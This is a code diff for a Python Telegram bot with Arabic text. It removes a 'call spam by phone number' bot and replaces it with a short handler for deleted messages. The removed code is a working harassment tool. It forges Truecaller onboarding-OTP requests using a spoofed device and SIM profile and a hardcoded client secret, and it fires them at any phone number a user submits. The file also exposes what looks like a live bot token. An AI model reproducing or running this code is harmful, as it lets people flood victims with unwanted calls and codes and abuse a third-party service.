@@ -1,98 +1,24 @@
-import requests , hashlib
-import random
-import telebot
-from telebot.types import InlineKeyboardButton as Btn , InlineKeyboardMarkup as Mak
-import time
+from telegram.ext import Updater, MessageHandler, Filters
 
-asa = '123456789'
-gigk = ''.join(random.choice(asa) for _ in range(10))
+# تعريف وظيفة لإرسال رسالة عند حذف الرسالة
+def deleted_message(update, context):
+    deleted_message_text = "تم حذف الرسالة التالية:\n{}".format(update.message.text)
+    context.bot.send_message(chat_id=update.effective_chat.id, text=deleted_message_text)
 
-md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
+# تعريف وظيفة البدء للتفاعل مع الرسائل
+def main():
+    # تعيين التوكن الخاص بالبوت
+    updater = Updater("YOUR_BOT_TOKEN", use_context=True)
 
-# @mmaahg & ICTS_930
-token = "6724095206:AAHcTqyenhPr3CJUlsRQblMYNHAYiJxZnmc"
-bot = telebot.TeleBot(token)
-# @mmaahg & ICTS_930
+    # اضافة المناسبة لمعالجة الرسائل المحذوفة
+    updater.dispatcher.add_handler(MessageHandler(Filters.text & (~Filters.update.edited_message), deleted_message))
 
-alokt = 0
+    # بدء البوت
+    updater.start_polling()
 
-sudo_id = "6024124201" #ايديك # id
+    # البقاء في الحلقة الرئيسية
+    updater.idle()
 
-ch = '@biduth' #يوزر القناة
-#user channel
-
-@bot.message_handler(commands=['start'])
-def start(message):
- msg = '''🚸| عذرا عزيزي
-🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه
-
-- مــعرف القـناة : {ch} 
-
-‼️| اشترك ثم ارسل /start'''
- idd = message.from_user.id
- url = f"https://api.telegram.org/bot{token}/getchatmember?chat_id={ch}&user_id={idd}"
- req = requests.get(url)
- if idd == sudo_id or 'member' in req.text or 'creator' in req.text or 'administartor' in req.text:
-    name = message.from_user.first_name
-    bot.reply_to(message, f'''اهلا بك عزيزي {name} في بوت 👾 سبام مكالمات عن طريق رقم الهاتف 
-
-ارسل رقم الهاتف
-مع رمز الدولة متبوع بعلامة +
-
-مثال:
-+96450100756''',reply_markup=Mak().add(Btn('ميو',callback_data='click')))
- 
- else:
-  bot.send_message(message.chat.id, """*🚸| عذرا عزيزي
-🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه
-
-- مــعرف القـناة : {} 
-
-‼️| اشترك ثم ارسل /start*""".format(ch),parse_mode="markdown")
-
-def call(number):
-    global alokt
-    current_time = time.time()
-
-    if current_time - alokt >= 60:
-        alokt = current_time
-
-        url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
-
-        headers = {
-            "Host": "account-asia-south1.truecaller.com",
-            "content-type": "application/json; charset=UTF-8",
-            "accept-encoding": "gzip",
-            "user-agent": "Truecaller/12.34.8 (Android; 8.1.2)",
-            "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
-        }
-
-        data = {"countryCode": "eg","dialingCode": 20,"installationDetails": {"app": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34,"store": "GOOGLE_PLAY"},"device": {"deviceId": md5,"language": "ar","manufacturer": "Xiaomi","mobileServices": ["GMS"],"model": "Redmi Note 8A Prime","osName": "Android","osVersion": "7.1.2","simSerials": ["8920022021714943876f","8920022022805258505f"]},"language": "ar","sims": [{"imsi": "602022207634386","mcc": "602","mnc": "2","operator": "vodafone"},{"imsi": "602023133590849","mcc": "602","mnc": "2","operator": "vodafone"}],"storeVersion": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34}},"phoneNumber": number,"region": "region-2","sequenceNo": 1
-    }
-
-        req = requests.post(url, headers=headers, json=data).json()
-        if req.get('status') == 40003:
-            return 'رقم الهاتف غير صحيح'
-        else:
-            phonum = req.get('parsedPhoneNumber')
-            coucode = req.get('parsedCountryCode')
-            text = f'''تم الارسال
-رقم الهاتف : {phonum} ✅
-رمز البلد : {coucode} .'''
-            return text
-    else:
-        remaining_time = int(60 - (current_time - alokt))
-        return f'لتفادي الظغط على البوت يرجى الإنتظار {remaining_time} ثواني.'
-
-@bot.message_handler(content_types=['text'])
-def num(message):
-    number = message.text
-    spam = call(number)
-    bot.reply_to(message,spam)
-
-@bot.callback_query_handler(func=lambda call: call.data == 'click')
-def all(call):
-	bot.send_message(call.message.chat.id,'''<  مبرمج البوت : @n_p_ii
-قناة مبرمج البوت: @PAYTHONBOTSFIELS''')
-
-bot.infinity_polling()
+# تنفيذ الدالة الرئيسية
+if __name__ == '__main__':
+    main()
